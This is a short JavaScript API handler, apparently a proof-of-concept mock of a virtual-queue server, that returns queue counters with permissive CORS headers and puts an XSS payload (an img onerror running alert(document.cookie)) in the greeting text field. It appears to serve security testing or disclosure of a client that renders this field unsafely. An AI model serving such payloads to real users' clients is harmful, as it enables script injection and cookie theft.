export default function handler(req, res) {

  const extra = {
    message: {
      greeting_info: {
        en: `<img src=x onerror="alert(document.cookie)">`
      }
    }
  };

  res
    .status(200)
    .setHeader("Access-Control-Allow-Origin", "*")
    .setHeader("Access-Control-Allow-Headers", "*")
    .setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
    .json({
      serving_counter: "1",
      queue_counter: "100",
      extra_information: JSON.stringify(extra),
      queue_position_expiry_period: 600,
      validity_period: 900
    });
}
